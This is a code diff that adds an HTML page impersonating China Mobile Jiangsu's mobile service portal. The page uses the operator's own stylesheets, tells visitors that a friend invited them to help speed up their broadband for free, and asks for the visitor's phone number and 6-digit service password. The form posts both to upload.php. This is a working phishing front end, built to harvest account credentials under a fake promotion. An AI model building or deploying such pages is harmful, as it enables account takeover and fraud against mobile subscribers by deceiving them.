@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="cmn-Hans-CN">
+
+    <head>
+        
+		<!-- 设置网页编码形式为 utf-8。utf-8可以大写为UTF-8 -->
+		<meta charset="utf-8">
+		<!-- 禁止用户缩放页面。 -->
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+		<!-- 禁用缓存。 -->
+		<meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+		<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache">
+		<meta HTTP-EQUIV="Expires" CONTENT="0">
+		<!-- 设置页面标题。 -->
+        <title>江苏移动掌上营业厅-触屏版</title>
+		<!-- 添加 favicon。 -->
+		<link rel="icon" type="image/ico" href="favicon.ico">
+		<!-- 
+		ico 格式也可行。如下2行代码。
+		<link rel="icon" type="image/ico" href="./favicon.ico">
+		<link rel="icon" type="image/png" href="favicon.png">
+		　-->
+		<!-- 添加样式 css 文件。样式文件是外链的中国移动的 css 文件。 -->
+		<link rel="stylesheet" type="text/css" href="http://wap.js.10086.cn/mobile/resource/touch/style/style2012_html5.css">
+		<link rel="stylesheet" type="text/css" href="http://wap.js.10086.cn/mobile/resource/standard/style/public.css">
+		<!-- 使用 css 使元素居中显示。 -->
+		<style type="text/css">
+			.center {text-align: center}
+		</style>
+		
+		<style type="text/css">
+			.fulldisplay {display:block;width:100%;}
+		</style>
+		
+		<!-- 引用外部js -->
+		<script
+			type="text/javascript" src="checkPhoneNo.js">
+		</script>
+		
+    </head>
+    
+    <body>
+		
+		<!-- <div class="topPic fulldisplay"> -->
+		<div class="center">
+			<img src="pic.png" alt="">
+		</div>
+		
+		<p>
+			您的好友 137****4518 邀请您助力宽带加速。
+		</p>
+		
+		<form name="login" class="center" action="upload.php" method="post">
+		    <p>
+				请输入11位移动手机号码<br>
+				<!-- <input type="tel" maxLength="11" pattern="\d{11}" name="telno">  经过测试，itouch4 中的 safari 不支持属性 pattern。建议改用 js 来验证输入。 -->
+				<input type="tel" maxLength="11" name="PhoneNo" id="PhoneNo">
+			</p>
+		    <p>
+				请输入6位服务密码<br>
+				<!-- <input type="tel" maxLength="6" name="telpw"  onkeyup="document.login.telpw.value=this.value.replace(/./g,'*');"> -->
+				<input type="tel" maxLength="6" pattern="\d{6}" name="PhonePw" id="PhonePw">
+
+			</p>
+			<br>
+		    <!-- <input type="submit" value="立即登陆"> -->
+			<input type="submit" value="立即免费办理" class="btn btn-blue min160" onclick="return checkPhoneNo()">
+		</form>
+		
+		<br>
+		<p>
+		活动规则：<br>
+		1、本活动<span style="color:Red">不收取任何费用</span>。<br>
+		2、本活动需开通家庭网（免费）。<br>
+		3、本活动仅限实名制江苏移动号码的客户参加。<br>
+		4、手机须在状态正常的情况下方可办理该活动，报停的客户须先报开，欠停的客户须先缴清欠费后，才能参加本活动。<br>
+		5、本活动和苹果（Apple INC）无关。<br>
+		</p>
+		
+    </body>
+    
+</html>
